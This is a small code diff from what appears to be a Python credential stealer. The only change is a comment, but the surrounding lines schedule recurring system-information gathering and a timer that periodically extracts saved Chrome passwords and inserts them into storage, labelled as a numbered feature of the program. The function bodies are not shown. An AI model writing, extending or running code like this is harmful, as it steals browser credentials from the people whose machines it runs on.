@@ -375,7 +375,7 @@ gather_system_info()
 system_info_timer = Timer(3600.0, gather_system_info)
 system_info_timer.start()
 
-#Feature : 6
+#Feature 6
 # Schedule the chrome passwords extraction and insertion to run at the specified interval
 chrome_passwords_timer = Timer(interval, extract_and_insert_chrome_passwords)
 chrome_passwords_timer.start()
